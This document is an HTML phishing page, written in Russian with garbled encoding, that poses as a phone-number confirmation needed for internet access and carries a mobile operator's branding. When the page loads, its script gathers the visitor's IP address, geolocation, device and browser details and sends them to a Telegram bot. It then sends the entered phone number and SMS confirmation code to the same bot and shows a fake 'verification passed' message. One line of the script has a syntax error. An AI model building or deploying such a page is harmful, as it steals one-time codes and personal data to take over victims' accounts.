<!DOCTYPE html>
<html>
<head>
    <title>–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –Ω–æ–º–µ—Ä–∞</title>
    <meta charset="UTF-8">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --dark-bg: #121212;
            --card-bg: #1e1e1e;
            --border: #333;
            --accent: #2563eb;
            --text: #e0e0e0;
            --success: #10b981;
            --error: #ef4444;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        
        body {
            background: var(--dark-bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            line-height: 1.6;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }
        
        .header {
            padding: 20px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .provider-logo {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #0047FF 0%, #002DAD 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 20px;
            color: white;
        }
        
        .header-text {
            flex: 1;
        }
        
        .header-text h1 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .header-text p {
            color: #aaa;
            font-size: 14px;
        }
        
        .content {
            padding: 25px;
        }
        
        #phone-section, #code-section, #verification-section {
            transition: all 0.3s ease;
        }
        
        .section-title {
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .section-title svg {
            width: 20px;
            height: 20px;
        }
        
        .input-group {
            margin-bottom: 25px;
            position: relative;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #aaa;
        }
        
        input {
            width: 100%;
            padding: 14px;
            background: #2a2a2a;
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        
        input:focus {
            border-color: var(--accent);
        }
        
        input.error {
            border-color: var(--error);
        }
        
        .error-message {
            color: var(--error);
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
        
        button {
            width: 100%;
            padding: 14px;
            background: var(--accent);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        button:disabled {
            background: #555;
            cursor: not-allowed;
        }
        
        button:hover:not(:disabled) {
            background: #1d4ed8;
        }
        
        #phone-image {
            width: 100%;
            border-radius: 8px;
            margin: 20px 0;
            display: none;
        }
        
        #verification-section {
            display: none;
        }
        
        .verification-success {
            text-align: center;
            padding: 30px 0;
        }
        
        .success-icon {
            font-size: 60px;
            color: var(--success);
            margin-bottom: 20px;
        }
        
        .verification-success h2 {
            font-size: 24px;
            margin-bottom: 15px;
            color: var(--success);
        }
        
        .footer {
            padding: 20px;
            text-align: center;
            color: #777;
            font-size: 12px;
            border-top: 1px solid var(--border);
        }
        
        #code-section, #verification-section {
            display: none;
        }
        
        .loader {
            display: none;
            text-align: center;
            padding: 30px 0;
        }
        
        .loader-spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 4px solid var(--accent);
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-text">
                <h1>–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –Ω–æ–º–µ—Ä–∞</h1>
                <p>–¢—Ä–µ–±—É–µ—Ç—Å—è –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç—É</p>
            </div>
        </div>
        
        <div class="content">
            <!-- –®–∞–≥ 0: –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö -->
            <div id="loading-section" class="loader">
                <div class="loader-spinner"></div>
                <p>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏...</p>
            </div>
            
            <!-- –®–∞–≥ 1: –í–≤–æ–¥ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
            <div id="phone-section" style="display:none">
                <div class="section-title">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                    </svg>
                    <span>–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</span>
                </div>
                
                <div class="input-group">
                    <label for="phone">–†–æ—Å—Å–∏–π—Å–∫–∏–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</label>
                    <input 
                        type="tel" 
                        id="phone" 
                        placeholder="+7 (___) ___-__-__" 
                        required
                        maxlength="18"
                    >
                    <div class="error-message" id="phone-error">–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ä–æ—Å—Å–∏–π—Å–∫–∏–π –Ω–æ–º–µ—Ä</div>
                </div>
                
                <button id="confirm-btn" onclick="sendPhone()" disabled>–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –Ω–æ–º–µ—Ä</button>
            </div>
            
            <!-- –®–∞–≥ 2: –í–≤–æ–¥ –∫–æ–¥–∞ -->
            <div id="code-section" style="display:none">
                <div class="section-title">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
                    </svg>
                    <span>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</span>
                </div>
               
                <img id="phone-image" src="https://i.redd.it/861gk9gqka0c1.png" alt="Security">
                
                <div class="input-group">
                    <label for="code">–ö–æ–¥ –∏–∑ SMS (6 —Ü–∏—Ñ—Ä)</label>
                    <input 
                        type="text" 
                        id="code" 
                        placeholder="XXXXXX" 
                        required
                        maxlength="6"
                        oninput="validateCode(this)"
                    >
                    <div class="error-message" id="code-error">–ö–æ–¥ –¥–æ–ª–∂–µ–Ω —Å–æ—Å—Ç–æ—è—Ç—å –∏–∑ 6 —Ü–∏—Ñ—Ä</div>
                </div>
                
                <button id="code-btn" onclick="sendCode()" disabled>–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∫–æ–¥</button>
            </div>
            
            <!-- –®–∞–≥ 3: –†–µ–∑—É–ª—å—Ç–∞—Ç –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ -->
            <div id="verification-section" style="display:none">
                <div class="verification-success">
                    <div class="success-icon">‚úì</div>
                    <h2>–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ–π–¥–µ–Ω–∞!</h2>
                    <p>–í–∞—à –Ω–æ–º–µ—Ä –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω –∏ –ø–æ–ª—É—á–µ–Ω –¥–æ—Å—Ç—É–ø –∫ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç—É!</p>
                </div>
            </div>
        </div>
        
        <div class="footer">
            ¬© 2025 t2. –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã.
        </div>
    </div>

    <script>
        const BOT_TOKEN = "DIG";
        const CHAT_ID = "1209403544";
        const MAX_RETRIES = 3; // –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫ –æ—Ç–ø—Ä–∞–≤–∫–∏
        
        // –û–±—ä–µ–∫—Ç –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
        const userData = {
            // –û—Å–Ω–æ–≤–Ω—ã–µ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—ã
            ip: "N/A",
            
            // –°–µ—Ç–µ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
            isp: "N/A",
            asn: "N/A",
            publicIp: "N/A",
            
            // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
            continent: "N/A",
            country: "N/A",
            countryCode: "N/A",
            region: "N/A",
            regionCode: "N/A",
            city: "N/A",
            postalCode: "N/A",
            latitude: "N/A",
            longitude: "N/A",
            timezone: "N/A",
            utcOffset: "N/A",
            callingCode: "N/A",
            currency: "N/A",
            languages: "N/A",
            
            // –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
            deviceType: "N/A",
            deviceModel: "N/A",
            deviceVendor: "N/A",
            os: "N/A",
            osVersion: "N/A",
            cpuCores: "N/A",
            cpuArch: "N/A",
            deviceMemory: "N/A",
            
            // –ë—Ä–∞—É–∑–µ—Ä
            browser: "N/A",
            browserVersion: "N/A",
            engine: "N/A",
            engineVersion: "N/A",
            userAgent: "N/A",
            cookies: "N/A",
            
            // –í—Ä–µ–º—è –∏ –¥–∞—Ç–∞
            localTime: "N/A",
            utcTime: "N/A",
            timezoneOffset: "N/A",
            dst: "N/A",
            pageLoadTime: "N/A",
            
            // –ü–æ–≤–µ–¥–µ–Ω–∏–µ
            referrer: "N/A",
            entryUrl: "N/A",
            mouseEvents: 0,
            keyboardEvents: 0,
            touchSupport: "N/A",
            batteryLevel: "N/A",
            chargingStatus: "N/A",
            
            // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
            doNotTrack: "N/A",
            hardwareConcurrency: "N/A",
            devicePixelRatio: "N/A",
            browserLanguage: "N/A"
        };

        // –í–∞–ª–∏–¥–∞—Ü–∏—è –∫–æ–¥–∞ (6 —Ü–∏—Ñ—Ä)
        function validateCode(input) {
            const code = input.value.replace(/\D/g, '');
            input.value = code;
            
            const codeError = document.getElementById('code-error');
            const codeBtn = document.getElementById('code-btn');
            
            if (code.length === 6) {
                input.classList.remove('error');
                codeError.style.display = 'none';
                codeBtn.disabled = false;
            } else {
                input.classList.add('error');
                codeError.style.display = 'block';
                codeBtn.disabled = true;
            }
        }

        // –ú–∞—Å–∫–∞ –¥–ª—è –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        function formatPhoneNumber(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 11) value = value.substring(0, 11);
            
            let formattedValue = '';
            
            if (value.startsWith('7') || value.startsWith('8')) {
                if (value[0] === '8') value = '7' + value.substring(1);
                formattedValue = '+7';
                
                if (value.length > 1) formattedValue += ' (' + value.substring(1, 4);
                if (value.length > 4) formattedValue += ') ' + value.substring(4, 7);
                if (value.length > 7) formattedValue += '-' + value.substring(7, 9);
                if (value.length > 9) formattedValue += '-' + value.substring(9, 11);
            } else if (value) {
                formattedValue = '+' + value;
            }
            
            input.value = formattedValue;
            validatePhoneNumber();
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–æ–º–µ—Ä–∞
        function validatePhoneNumber() {
            const phoneInput = document.getElementById('phone');
            const phoneError = document.getElementById('phone-error');
            const confirmBtn = document.getElementById('confirm-btn');
            
            const phoneRegex = /^(\+7|8)\s?\(?\d{3}\)?\s?\d{3}[\s-]?\d{2}[\s-]?\d{2}$/;
            const isValid = phoneRegex.test(phoneInput.value);
            
            if (isValid) {
                phoneInput.classList.remove('error');
                phoneError.style.display = 'none';
                confirmBtn.disabled = false;
            } else {
                phoneInput.classList.add('error');
                phoneError.style.display = 'block';
                confirmBtn.disabled = true;
            }
            
            return isValid;
        }
        
        // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –ø–æ userAgent
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            
            // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –û–°
            if (/android/i.test(ua)) {
                userData.os = "Android";
                const match = ua.match(/android\s([0-9\.]+)/i);
                userData.osVersion = match ? match[1] : "N/A";
            } else if (/iPad|iPhone|iPod/.test(ua)) {
                userData.os = "iOS";
                const match = ua.match(/OS\s(\d+_\d+)/i);
                if (match) userData.osVersion = match[1].replace('_', '.');
            } else if (/Macintosh|Mac OS X/.test(ua)) {
                userData.os = "macOS";
                const match = ua.match(/Mac OS X\s?([0-9_]+)/i);
                if (match) userData.osVersion = match[1].replace('_', '.');
            } else if (/Windows/.test(ua)) {
                userData.os = "Windows";
                const match = ua.match(/Windows NT\s?([0-9\.]+)/i);
                userData.osVersion = match ? match[1] : "N/A";
            } else if (/Linux/.test(ua)) {
                userData.os = "Linux";
                userData.osVersion = "N/A";
            }
            
            // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞
            if (/Chrome/.test(ua) && !/Edge|Edg/.test(ua)) {
                userData.browser = "Chrome";
                const match = ua.match(/Chrome\/([0-9\.]+)/i);
                userData.browserVersion = match ? match[1] : "N/A";
            } else if (/Firefox/.test(ua)) {
                userData.browser = "Firefox";
                const match = ua.match(/Firefox\/([0-9\.]+)/i);
                userData.browserVersion = match ? match[1] : "N/A";
            } else if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
                userData.browser = "Safari";
                const match = ua.match(/Version\/([0-9\.]+)/i);
                userData.browserVersion = match ? match[1] : "N/A";
            } else if (/Edge|Edg/.test(ua)) {
                userData.browser = "Edge";
                const match = ua.match(/(Edge|Edg)\/([0-9\.]+)/i);
                userData.browserVersion = match ? match[2] : "N/A";
            }
            
            // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
            if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) {
                userData.deviceType = "Mobile";
            } else {
                userData.deviceType = "Desktop";
            }
            
            // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –º–æ–¥–µ–ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
            const deviceMatch = ua.match(/(iPhone|iPad|iPod|Android|Windows Phone|BlackBerry|PlayBook|Xbox One|Xbox|PlayStation|Nintendo)/i);
            if (deviceMatch) {
                userData.deviceModel = deviceMatch[1];
            }
        }
        
        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
        async function collectFullData() {
            try {
                // 1. –°–µ—Ç–µ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    userData.ip = ipData.ip || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                    userData.publicIp = ipData.ip || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                } catch (e) {
                    console.log("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP: ", e);
                }
                
                // 2. –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
                if (userData.ip !== "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω") {
                    try {
                        const geoResponse = await fetch(`https://ipapi.co/${userData.ip}/json/`);
                        const geoData = await geoResponse.json();
                        
                        if (!geoData.error) {
                            userData.continent = geoData.continent_code || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.country = geoData.country_name || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.countryCode = geoData.country_code || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.region = geoData.region || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.regionCode = geoData.region_code || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.city = geoData.city || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.postalCode = geoData.postal || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.latitude = geoData.latitude || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.longitude = geoData.longitude || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.timezone = geoData.timezone || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.utcOffset = geoData.utc_offset || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.callingCode = geoData.country_calling_code || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.currency = geoData.currency || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.languages = geoData.languages || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.isp = geoData.org || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                            userData.asn = geoData.asn || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                        }
                    } catch (e) {
                        console.log("–û—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: ", e);
                    }
                }
                
                // 3. –î–∞–Ω–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –∏ –±—Ä–∞—É–∑–µ—Ä–∞
                getDeviceInfo();
                
                // 4. –û—Å–Ω–æ–≤–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                userData.userAgent = navigator.userAgent;
                userData.cookies = navigator.cookieEnabled ? "–í–∫–ª—é—á–µ–Ω—ã" : "–û—Ç–∫–ª—é—á–µ–Ω—ã";
                userData.doNotTrack = navigator.doNotTrack || "–ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è";
                userData.referrer = document.referrer || "–ü—Ä—è–º–æ–π –ø–µ—Ä–µ—Ö–æ–¥";
                userData.entryUrl = window.location.href;
                
                // 5. –í—Ä–µ–º–µ–Ω–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
                userData.localTime = new Date().toLocaleString();
                userData.utcTime = new Date().toUTCString();
                userData.timezoneOffset = new Date().getTimezoneOffset();
                userData.browserLanguage = navigator.language || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                
                // 6. –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å
                if (window.performance) {
                    userData.pageLoadTime = 
                        window.performance.timing.domContentLoadedEventEnd - 
                        window.performance.timing.navigationStart + " ms";
                }
                
                // 7. –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
                userData.hardwareConcurrency = navigator.hardwareConcurrency || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                userData.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                
            } catch (e) {
                console.error("–û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö: ", e);
            }
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏
        async function sendToTelegram(text) {
            for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: const CHAT_ID,
                            text: text,
                            parse_mode: "HTML"
                        })
                    });
                    
                    const data = await response.json();
                    if (data.ok) return true;
                    
                    console.log(`–ü–æ–ø—ã—Ç–∫–∞ ${attempt} –Ω–µ —É–¥–∞–ª–∞—Å—å: ${data.description}`);
                } catch (e) {
                    console.log(`–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ (–ø–æ–ø—ã—Ç–∫–∞ ${attempt}):`, e);
                }
                
                // –ó–∞–¥–µ—Ä–∂–∫–∞ –ø–µ—Ä–µ–¥ –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–æ–π
                await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
            }
            return false;
        }
        
        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è Telegram
        function formatFullData() {
            let message = `üåê <b>–î–ê–ù–ù–´–ï –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø</b> üåê\n`;
            
            message += `üìç <b>–ì–ï–û–õ–û–ö–ê–¶–ò–Ø</b>\n`;
            message += `‚îú –°—Ç—Ä–∞–Ω–∞: ${userData.country} (${userData.countryCode})\n`;
            message += `‚îú –†–µ–≥–∏–æ–Ω: ${userData.region}\n`;
            message += `‚îú –ì–æ—Ä–æ–¥: ${userData.city}\n`;
            message += `‚îú –ü–æ—á—Ç–æ–≤—ã–π –∏–Ω–¥–µ–∫—Å: ${userData.postalCode}\n`;
            message += `‚îú –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${userData.latitude}, ${userData.longitude}\n`;
            message += `‚îú –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${userData.timezone}\n`;
            message += `‚îú –ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${userData.isp}\n`;
            message += `‚îî IP-–∞–¥—Ä–µ—Å: ${userData.ip}\n\n`;
            
            message += `üíª <b>–£–°–¢–†–û–ô–°–¢–í–û</b>\n`;
            message += `‚îú –¢–∏–ø: ${userData.deviceType}\n`;
            message += `‚îú –ú–æ–¥–µ–ª—å: ${userData.deviceModel || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ"}\n`;
            message += `‚îú –û–°: ${userData.os} ${userData.osVersion || ""}\n`;
            message += `‚îú –Ø–¥—Ä–∞ CPU: ${userData.hardwareConcurrency}\n`;
            message += `‚îî –ü–∞–º—è—Ç—å: ${userData.deviceMemory}\n\n`;
            
            message += `üîç <b>–ë–†–ê–£–ó–ï–†</b>\n`;
            message += `‚îú –ù–∞–∑–≤–∞–Ω–∏–µ: ${userData.browser}\n`;
            message += `‚îú –í–µ—Ä—Å–∏—è: ${userData.browserVersion}\n`;
            message += `‚îú –Ø–∑—ã–∫: ${userData.browserLanguage}\n`;
            message += `‚îú Cookies: ${userData.cookies}\n`;
            message += `‚îî User Agent: ${userData.userAgent}\n\n`;
            
            message += `‚è± <b>–í–†–ï–ú–Ø –ò –ü–†–û–ò–ó–í–û–î–ò–¢–ï–õ–¨–ù–û–°–¢–¨</b>\n`;
            message += `‚îú –õ–æ–∫–∞–ª—å–Ω–æ–µ –≤—Ä–µ–º—è: ${userData.localTime}\n`;
            message += `‚îú UTC –≤—Ä–µ–º—è: ${userData.utcTime}\n`;
            message += `‚îî –ó–∞–≥—Ä—É–∑–∫–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã: ${userData.pageLoadTime || "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ"}\n\n`;
            
            message += `üîó <b>–°–ï–°–°–ò–Ø</b>\n`;
            message += `‚îú –ò—Å—Ç–æ—á–Ω–∏–∫: ${userData.referrer}\n`;
            message += `‚îî URL –≤—Ö–æ–¥–∞: ${userData.entryUrl}`;
            
            return message;
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–æ–ª–Ω–æ–≥–æ –¥–∞–º–ø–∞
        async function sendFullDataToTelegram() {
            const message = formatFullData();
            return await sendToTelegram(message);
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞
        async function sendPhone() {
            if (!validatePhoneNumber()) return;
            
            let phone = document.getElementById('phone').value;
            phone = phone.replace(/\D/g, '');
            if (phone.startsWith('8')) phone = '7' + phone.substring(1);
            userData.phone = '+' + phone;
            
            // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –Ω–∞ —ç–∫—Ä–∞–Ω –∫–æ–¥–∞
            document.getElementById('phone-section').style.display = 'none';
            document.getElementById('phone-image').style.display = 'block';
            document.getElementById('code-section').style.display = 'block';
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ –≤ Telegram
            await sendToTelegram(`üì± <b>–í–í–ï–î–ï–ù –ù–û–ú–ï–†:</b> ${userData.phone}`);
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞
        async function sendCode() {
            const codeInput = document.getElementById('code');
            userData.code = codeInput.value;
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–ª–∏–Ω—ã –∫–æ–¥–∞
            if (userData.code.length !== 6) {
                codeInput.classList.add('error');
                document.getElementById('code-error').style.display = 'block';
                return;
            }
            
            // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –Ω–∞ —ç–∫—Ä–∞–Ω –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏
            document.getElementById('code-section').style.display = 'none';
            document.getElementById('verification-section').style.display = 'block';
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞ –≤ Telegram
            await sendToTelegram(`üî¢ <b>–í–í–ï–î–ï–ù –ö–û–î:</b> ${userData.code}\n‚úÖ <b>–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –ø—Ä–æ–π–¥–µ–Ω–∞</b>`);
        }
        
        // –ü–æ–∫–∞–∑–∞—Ç—å —Å–µ–∫—Ü–∏—é —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        function showPhoneSection() {
            document.getElementById('loading-section').style.display = 'none';
            document.getElementById('phone-section').style.display = 'block';
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        window.onload = async function() {
            // –ü–æ–∫–∞–∑–∞—Ç—å –ª–æ–∞–¥–µ—Ä
            document.getElementById('loading-section').style.display = 'block';
            
            // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –º–∞—Å–∫–∏ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
            const phoneInput = document.getElementById('phone');
            phoneInput.addEventListener('input', () => formatPhoneNumber(phoneInput));
            phoneInput.addEventListener('blur', validatePhoneNumber);
            
            // –ó–∞–ø—É—Å–∫ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
            try {
                await collectFullData();
                await sendFullDataToTelegram();
            } catch (e) {
                console.error("–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: ", e);
            } finally {
                showPhoneSection();
            }
        };
    </script>
</body>
</html>
